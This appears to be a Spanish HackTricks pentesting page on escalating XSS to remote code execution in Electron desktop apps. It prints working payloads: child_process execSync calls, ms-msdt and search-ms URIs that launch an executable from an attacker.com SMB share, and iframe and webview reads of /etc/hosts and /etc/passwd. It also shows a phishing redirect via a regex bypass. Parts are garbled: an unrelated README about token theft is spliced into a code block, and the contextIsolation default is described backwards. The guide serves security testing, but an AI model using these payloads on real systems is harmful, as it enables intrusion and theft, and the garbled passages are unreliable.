## XSS a RCE en aplicaciones de escritorio Electron

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Introducci√≥n

Electron est√° **basado en Chromium**, pero no es un navegador. Ciertos principios y mecanismos de seguridad implementados por los navegadores modernos no est√°n presentes.\
Podr√≠as ver Electron como una aplicaci√≥n local de backend+frontend donde **NodeJS** es el **backend** y **Chromium** es el **frontend**.

Por lo general, es posible encontrar el c√≥digo de la aplicaci√≥n Electron dentro de una aplicaci√≥n `.asar`, para obtener el c√≥digo es necesario extraerlo:
```bash
npx asar extract app.asar destfolder #Extract everything
npx asar extract-file app.asar main.js #Extract just a file
```
En el c√≥digo fuente de una aplicaci√≥n Electron, dentro de `packet.json`, se puede encontrar especificado el archivo `main.js` donde se establecen las configuraciones de seguridad.
```json
{
  "name": "standard-notes",
  "main": "./app/index.js",
```
Electron tiene 2 tipos de procesos:

* Proceso principal (tiene acceso completo a NodeJS)
* Proceso de renderizado (debe tener acceso restringido a NodeJS por razones de seguridad)

![](<../../../.gitbook/assets/image (307) (5) (1).png>)

Un **proceso de renderizado** ser√° una ventana del navegador que carga un archivo:
```javascript
const {BrowserWindow} = require('electron');
let win = new BrowserWindow();

//Open Renderer Process
win.loadURL(`file://path/to/index.html`);
```
La configuraci√≥n del **proceso de renderizado** se puede **configurar** en el **proceso principal** dentro del archivo main.js. Algunas de las configuraciones **evitar√°n que la aplicaci√≥n Electron obtenga RCE** u otras vulnerabilidades si las **configuraciones se configuran correctamente**.

La aplicaci√≥n de escritorio podr√≠a tener acceso al dispositivo del usuario a trav√©s de las API de Node. Las siguientes dos configuraciones son responsables de proporcionar mecanismos para **evitar que el JavaScript de la aplicaci√≥n tenga acceso directo al dispositivo del usuario** y a los comandos del nivel del sistema.

* **`nodeIntegration`** - est√° desactivado de forma predeterminada. Si est√° activado, permite acceder a las funciones de Node desde el proceso de renderizado.
* **`contextIsolation`** - est√° activado de forma predeterminada. Si est√° activado, los procesos principal y de renderizado no est√°n aislados.
* **`preload`** - vac√≠o de forma predeterminada.
* [**`sandbox`**](https://docs.w3cub.com/electron/api/sandbox-option) - est√° desactivado de forma predeterminada. Restringir√° las acciones que NodeJS puede realizar.
* Integraci√≥n de Node en trabajadores
* **`nodeIntegrationInSubframes`** - est√° desactivado de forma predeterminada.
  * Si **`nodeIntegration`** est√° **habilitado**, esto permitir√≠a el uso de **API de Node.js** en p√°ginas web que se cargan en iframes dentro de una aplicaci√≥n Electron.
  * Si **`nodeIntegration`** est√° **deshabilitado**, entonces los preloads se cargar√°n en el iframe.

Ejemplo de configuraci√≥n:
```javascript
const mainWindowOptions = {
  title: 'Discord',
  backgroundColor: getBackgroundColor(),
  width: DEFAULT_WIDTH,
  height: DEFAULT_HEIGHT,
  minWidth: MIN_WIDTH,
  minHeight: MIN_HEIGHT,
  transparent: false,
  frame: false,
  resizable: true,
  show: isVisible,
  webPreferences: {
    blinkFeatures: 'EnumerateDevices,AudioOutputDevices',
    nodeIntegration: false,
    contextIsolation: false,
    sandbox: false,
    nodeIntegrationInSubFrames: false,
    preload: _path2.default.join(__dirname, 'mainScreenPreload.js'),
    nativeWindowOpen: true,
    enableRemoteModule: false,
    spellcheck: true
  }
};
```
Algunos **payloads de RCE** de [aqu√≠](https://7as.es/electron/nodeIntegration\_rce.txt):
```html
Example Payloads (Windows):
<img src=x onerror="alert(require('child_process').execSync('calc').toString());"> 

Example Payloads (Linux & MacOS):
<img src=x onerror="alert(require('child_process').execSync('gnome-calculator').toString());">
<img src=x onerror="alert(require('child_process').execSync('/System/Applications/Calculator.app/Contents/MacOS/Calculator').toString());"> 
<img src=x onerror="alert(require('child_process').execSync('id').toString());"> 
<img src=x onerror="alert(require('child_process').execSync('ls -l').toString());">
<img src=x onerror="alert(require('child_process').execSync('uname -a').toString());"> 
```
### Capturar tr√°fico

Modifica la configuraci√≥n start-main y agrega el uso de un proxy como:
```javascript
"start-main": "electron ./dist/main/main.js --proxy-server=127.0.0.1:8080 --ignore-certificateerrors",
```
## RCE: XSS + nodeIntegration

Si se establece **nodeIntegration** en **on**, el JavaScript de una p√°gina web puede usar f√°cilmente las caracter√≠sticas de Node.js simplemente llamando a `require()`. Por ejemplo, la forma de ejecutar la aplicaci√≥n calc en Windows es:
```html
<script>
  require('child_process').exec('calc');
  // or
  top.require('child_process').exec('open /System/Applications/Calculator.app');
</script>
```
<figure><img src="../../../.gitbook/assets/image (5) (4).png" alt=""><figcaption></figcaption></figure>

## RCE: preload

El script indicado en esta configuraci√≥n se carga antes que otros scripts en el renderizador, por lo que tiene acceso ilimitado a las API de Node:
```javascript
new BrowserWindow{
  webPreferences: {
    nodeIntegration: false,
    preload: _path2.default.join(__dirname, 'perload.js'),
  }
});
```
Por lo tanto, el script puede exportar las caracter√≠sticas del nodo a las p√°ginas:

{% code title="preload.js" %}
```javascript
typeof require === 'function';
window.runCalc = function(){
    require('child_process').exec('calc')
};
```
{% endcode %}

{% code title="index.html" %}

# XSS to RCE in Electron Desktop Apps

Este repositorio contiene un ejemplo de c√≥mo una vulnerabilidad de XSS en una aplicaci√≥n de escritorio de Electron puede ser explotada para lograr la ejecuci√≥n remota de c√≥digo (RCE).

## Descripci√≥n

La vulnerabilidad se encuentra en la funci√≥n `loadURL` de la clase `BrowserWindow` de Electron. Si se pasa una URL maliciosa a esta funci√≥n, se puede inyectar c√≥digo JavaScript en el contexto de la p√°gina cargada. En este ejemplo, se utiliza una carga √∫til de XSS para robar el token de autenticaci√≥n de la aplicaci√≥n y enviarlo a un servidor controlado por el atacante.

Una vez que el atacante tiene el token de autenticaci√≥n, puede usarlo para realizar acciones en nombre del usuario leg√≠timo. En este ejemplo, se utiliza el token para enviar un mensaje de correo electr√≥nico desde la aplicaci√≥n de correo electr√≥nico predeterminada del usuario.

## Uso

Para ejecutar este ejemplo, siga estos pasos:

1. Clonar este repositorio
2. Instalar las dependencias con `npm install`
3. Ejecutar el servidor de prueba con `npm run server`
4. Ejecutar la aplicaci√≥n de escritorio con `npm start`

La aplicaci√≥n de escritorio abrir√° una ventana que carga una p√°gina web local. Haga clic en el bot√≥n "Iniciar sesi√≥n" y use las credenciales de prueba (usuario: `test`, contrase√±a: `test`) para iniciar sesi√≥n. Una vez que haya iniciado sesi√≥n, se mostrar√° un mensaje que indica que se ha robado el token de autenticaci√≥n.

## Mitigaci√≥n

Para mitigar esta vulnerabilidad, se deben seguir las siguientes pr√°cticas recomendadas:

- Validar todas las entradas del usuario y escapar de las cadenas de caracteres antes de pasarlas a funciones peligrosas como `loadURL`.
- Configurar la pol√≠tica de seguridad de contenido de Electron para evitar la ejecuci√≥n de c√≥digo no deseado.
- Mantener actualizadas todas las dependencias de Electron y aplicar parches de seguridad seg√∫n sea necesario.

## Cr√©ditos

Este ejemplo fue creado por [Felix Krause](https://twitter.com/KrauseFx) y se basa en su art√≠culo [XSS to RCE in Electron-based Apps](https://felixkrause.github.io/XSS-to-RCE-in-Electron-Apps/).

{% endcode %}
```html
<body>
    <script>
        typeof require === 'undefined';
        runCalc();
    </script>
</body>
```
{% endcode %}

{% hint style="info" %}
**Si `contextIsolation` est√° activado, esto no funcionar√°**
{% endhint %}

## RCE: XSS + contextIsolation

El _**contextIsolation**_ introduce los **contextos separados entre los scripts de la p√°gina web y el c√≥digo interno de JavaScript de Electron** para que la ejecuci√≥n de JavaScript de cada c√≥digo no afecte a cada uno. Esta es una caracter√≠stica necesaria para eliminar la posibilidad de RCE.

Si los contextos no est√°n aislados, un atacante puede:

1. Ejecutar **JavaScript arbitrario en el renderizador** (XSS o navegaci√≥n a sitios externos)
2. **Sobrescribir el m√©todo integrado** que se utiliza en el c√≥digo de precarga o en el c√≥digo interno de Electron a su propia funci√≥n
3. **Activar** el uso de la **funci√≥n sobrescrita**
4. ¬øRCE?

Hay 2 lugares donde se pueden sobrescribir los m√©todos integrados: en el c√≥digo de precarga o en el c√≥digo interno de Electron:

{% content-ref url="electron-contextisolation-rce-via-preload-code.md" %}
[electron-contextisolation-rce-via-preload-code.md](electron-contextisolation-rce-via-preload-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-electron-internal-code.md" %}
[electron-contextisolation-rce-via-electron-internal-code.md](electron-contextisolation-rce-via-electron-internal-code.md)
{% endcontent-ref %}

{% content-ref url="electron-contextisolation-rce-via-ipc.md" %}
[electron-contextisolation-rce-via-ipc.md](electron-contextisolation-rce-via-ipc.md)
{% endcontent-ref %}

### Bypass del evento de clic

Si se aplican restricciones cuando se hace clic en un enlace, es posible que se pueda evitar **haciendo clic en el bot√≥n central** en lugar de hacer clic izquierdo regular.
```javascript
window.addEventListener('click', (e) => { 
```
## RCE a trav√©s de shell.openExternal

Si la aplicaci√≥n de escritorio de Electron se implementa con la configuraci√≥n adecuada de `nodeIntegration` y `contextIsolation`, simplemente significa que **no se puede lograr una RCE del lado del cliente apuntando a scripts de precarga o c√≥digo nativo de Electron desde el proceso principal**.

Cada vez que un usuario hace clic en el enlace o abre una nueva ventana, se invocan los siguientes escuchadores de eventos:

{% code overflow="wrap" %}
```javascript
webContents.on("new-window", function (event, url, disposition, options) {}
webContents.on("will-navigate", function (event, url) {}
```
{% endcode %}

La aplicaci√≥n de escritorio **anula estos oyentes** para implementar la **l√≥gica de negocio** propia de la aplicaci√≥n de escritorio. Durante la creaci√≥n de nuevas ventanas, la aplicaci√≥n verifica si el enlace navegado debe abrirse en una ventana o pesta√±a de la aplicaci√≥n de escritorio, o si debe abrirse en el navegador web. En nuestro ejemplo, la verificaci√≥n se implementa con la funci√≥n `openInternally`, si devuelve `false`, la aplicaci√≥n asumir√° que el enlace debe abrirse en el navegador web utilizando la funci√≥n `shell.openExternal`.

**Aqu√≠ hay un pseudoc√≥digo simplificado:**

![](<../../../.gitbook/assets/image (638) (2) (1) (1).png>)

![](<../../../.gitbook/assets/image (620).png>)

De acuerdo con las mejores pr√°cticas de seguridad de Electron JS, la funci√≥n `openExternal` **no debe aceptar contenido no confiable** **porque eso podr√≠a llevar a RCE abusando de diferentes protocolos** si la aplicaci√≥n no limita la navegaci√≥n de los usuarios a trav√©s de protocolos como https:// o http://.

Diferentes sistemas operativos admiten diferentes protocolos que podr√≠an desencadenar RCE, para obtener m√°s informaci√≥n sobre ellos, consulte [https://positive.security/blog/url-open-rce](https://positive.security/blog/url-open-rce#windows-10-19042) pero aqu√≠ tiene algunos ejemplos de Windows:
```html
<script>
window.open("ms-msdt:id%20PCWDiagnostic%20%2Fmoreoptions%20false%20%2Fskip%20true%20%2Fparam%20IT_BrowseForFile%3D%22%5Cattacker.comsmb_sharemalicious_executable.exe%22%20%2Fparam%20IT_SelectProgram%3D%22NotListed%22%20%2Fparam%20IT_AutoTroubleshoot%3D%22ts_AUTO%22")
</script>


<script>
window.open("search-ms:query=malicious_executable.exe&crumb=location:%5C%[5Cattacker.com](<http://5cattacker.com/>)%5Csmb_share%5Ctools&displayname=Important%20update")
</script>


<script>
window.open("ms-officecmd:%7B%22id%22:3,%22LocalProviders.LaunchOfficeAppForResult%22:%7B%22details%22:%7B%22appId%22:5,%22name%22:%22Teams%22,%22discovered%22:%7B%22command%22:%22teams.exe%22,%22uri%22:%22msteams%22%7D%7D,%22filename%22:%22a:/b/%2520--disable-gpu-sandbox%2520--gpu-launcher=%22C:%5CWindows%5CSystem32%5Ccmd%2520/c%2520ping%252016843009%2520&&%2520%22%22%7D%7D")
</script>
```
Para obtener m√°s informaci√≥n sobre estos ejemplos, consulte [https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8](https://shabarkin.medium.com/1-click-rce-in-electron-applications-79b52e1fe8b8) y [https://benjamin-altpeter.de/shell-openexternal-dangers/](https://benjamin-altpeter.de/shell-openexternal-dangers/)

## Leer archivos internos: XSS + contextIsolation

Si `contextIsolation` se establece en falso, puede intentar usar \<webview> (similar a \<iframe> pero puede cargar archivos locales) para leer archivos locales y extraerlos: usando algo como **\<webview src=‚Äùfile:///etc/passwd‚Äù>\</webview>:**

![](../../../.gitbook/assets/1-u1jdryuwaevwjmf\_f2ttjg.png)

Otra forma de **leer un archivo interno** se encuentra en este [**informe**](https://bugcrowd.com/disclosures/f7ce8504-0152-483b-bbf3-fb9b759f9f89/critical-local-file-read-in-electron-desktop-app).
```html
<br><BR><BR><BR>
<h1>pwn<br>
<iframe onload=j() src="/etc/hosts">xssxsxxsxs</iframe>
<script type="text/javascript">
    function j(){alert('pwned contents of /etc/hosts :\n\n '+frames[0].document.body.innerText)}
</script>
```
## **RCE: XSS + Chromium antiguo**

Si la aplicaci√≥n utiliza **chromium** antiguo y hay **vulnerabilidades conocidas** en √©l, podr√≠a ser posible **explotarlo y obtener RCE a trav√©s de un XSS**.\
Puedes ver un ejemplo en este **writeup**: [https://blog.electrovolt.io/posts/discord-rce/](https://blog.electrovolt.io/posts/discord-rce/)

## **XSS Phishing a trav√©s de la omisi√≥n de regex de URL interna**

Suponiendo que encontraste un XSS pero **no puedes activar RCE o robar archivos internos**, podr√≠as intentar usarlo para **robar credenciales a trav√©s de phishing**.

En primer lugar, necesitas saber qu√© sucede cuando intentas abrir una nueva URL, revisando el c√≥digo JS en el front-end:
```javascript
webContents.on("new-window", function (event, url, disposition, options) {} // opens the custom openInternally function (it is declared below)
webContents.on("will-navigate", function (event, url) {}                    // opens the custom openInternally function (it is declared below)
```
La llamada a **`openInternally`** decidir√° si el **enlace** se abrir√° en la **ventana del escritorio** ya que es un enlace perteneciente a la plataforma, **o** si se abrir√° en el **navegador como un recurso de terceros**.

En caso de que el **regex** utilizado por la funci√≥n sea **vulnerable a bypasses** (por ejemplo, **no escapando los puntos de los subdominios**) un atacante podr√≠a abusar del XSS para **abrir una nueva ventana que** se ubicar√° en la infraestructura del atacante **solicitando credenciales** al usuario:
```html
<script>
window.open("<http://subdomainagoogleq.com/index.html>")
</script>
```
## **Herramientas**

* [**Electronegativity**](https://github.com/doyensec/electronegativity) es una herramienta para identificar configuraciones incorrectas y patrones de seguridad en aplicaciones basadas en Electron.
* [**Electrolint**](https://github.com/ksdmitrieva/electrolint) es un plugin de c√≥digo abierto para VS Code para aplicaciones de Electron que utiliza Electronegativity.
* [**nodejsscan**](https://github.com/ajinabraham/nodejsscan) para comprobar bibliotecas de terceros vulnerables.
* [**Electro.ng**](https://electro.ng/): Hay que comprarla.

## Laboratorios

En [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s) puedes encontrar un laboratorio para explotar aplicaciones de Electron vulnerables.

Algunos comandos que te ayudar√°n en el laboratorio:
```bash
# Download apps from these URls
# Vuln to nodeIntegration
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable1.zip
# Vuln to contextIsolation via preload script
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable2.zip
# Vuln to IPC Rce
https://training.7asecurity.com/ma/webinar/desktop-xss-rce/apps/vulnerable3.zip

# Get inside the electron app and check for vulnerabilities
npm audit

# How to use electronegativity
npm install @doyensec/electronegativity -g
electronegativity -i vulnerable1

# Run an application from source code
npm install -g electron
cd vulnerable1
npm install
npm start
```
## **Referencias**

* [https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028](https://shabarkin.medium.com/unsafe-content-loading-electron-js-76296b6ac028)
* [https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d](https://medium.com/@renwa/facebook-messenger-desktop-app-arbitrary-file-read-db2374550f6d)
* [https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en?slide=8)
* [https://www.youtube.com/watch?v=a-YnG3Mx-Tg](https://www.youtube.com/watch?v=a-YnG3Mx-Tg)
* [https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s](https://www.youtube.com/watch?v=xILfQGkLXQo\&t=22s)
* M√°s investigaciones y art√≠culos sobre la seguridad de Electron en [https://github.com/doyensec/awesome-electronjs-hacking](https://github.com/doyensec/awesome-electronjs-hacking)
* [https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81](https://www.youtube.com/watch?v=Tzo8ucHA5xw\&list=PLH15HpR5qRsVKcKwvIl-AzGfRqKyx--zq\&index=81)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PR al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
